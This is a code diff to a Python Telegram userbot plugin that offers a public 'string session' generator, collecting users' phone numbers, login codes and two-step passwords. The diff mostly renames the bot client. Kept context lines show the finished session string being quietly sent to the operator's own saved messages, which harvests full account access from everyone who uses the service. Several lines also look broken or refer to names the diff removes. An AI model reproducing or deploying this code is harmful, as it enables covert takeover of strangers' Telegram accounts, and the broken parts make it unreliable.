@@ -53,16 +53,15 @@ TWO_STEPS_VERI = (" Semms That You Have Two Steps Verifcation Input Password")
 loggingd = logging.getLogger("STRING BOT ")
 
 
-from userbot.plugins.thunder import userb_bot as oo
-from userbot.plugins.thunder import bot  as cleine
+
 
 from userbot import bot as lol
 bgusername = Var.TG_BOT_USER_NAME_BF_HER
 
-@cleine.on(events.NewMessage(pattern="^/string"))
+@tgbot.on(events.NewMessage(pattern="^/string"))
 async def string(event):    
-    if not await cleine.is_user_authorized():
-        await cleine.send_message(
+    if not await tgbot.is_user_authorized():
+        await tgbot.send_message(
             event.chat_id,
             message=f"Press Start For Making String ",
             buttons=[
@@ -76,7 +75,7 @@ async def string(event):
             ],
         )
     elif event.query.user_id == lol.uid:
-        await cleine.send_message(
+        await tgbot.send_message(
             event.chat_id,
             message=f"Hi Master\n\nI'm Your Assistant Any One Can Contact Me To Get The String Session via {bgusername}",
             buttons=[
@@ -90,7 +89,7 @@ async def string(event):
             ],
         )
     else:     
-           await cleine.send_message(
+           await tgbot.send_message(
             event.chat_id,
             message=f"Press Start For Making String ",
             buttons=[
@@ -103,13 +102,13 @@ async def string(event):
                 [Button.url("Api Hash Bot", "@UseTGXBot")],
             ],
         )
-@cleine.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
+@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"start")))
 async def ass_string(event):   
     global assitant_client
 
 
 
-    with cleine.conversation(event.chat_id) as conv:
+    with tgbot.conversation(event.chat_id) as conv:
         
         response = conv.wait_event(events.NewMessage(
             chats=event.chat_id
@@ -134,7 +133,7 @@ async def ass_string(event):
     conv.send_message("Send The Code Something Like 1 6 8 9")
     
 
-    code = cleine.get_response()
+    code = tgbot.get_response()
     code_tf = None
     code = "".join(code.split(" "))
     token = Var.TG_BOT_TOKEN_BF_HER
@@ -165,7 +164,7 @@ async def ass_string(event):
     await conv.send_message(f"`{session_string}`")
     assitant_client = await current_client.get_me()
     try:    
-        await cleine.send_message(sender, f"Thanks For Creating String Session Via {bgusername}\n\nCheck You Saved Message")
+        await tgbot.send_message(sender, f"Thanks For Creating String Session Via {bgusername}\n\nCheck You Saved Message")
         striing=current_client.session.save()
         await userb_bot.send_message("me", f'{striing}')
     except Exception:
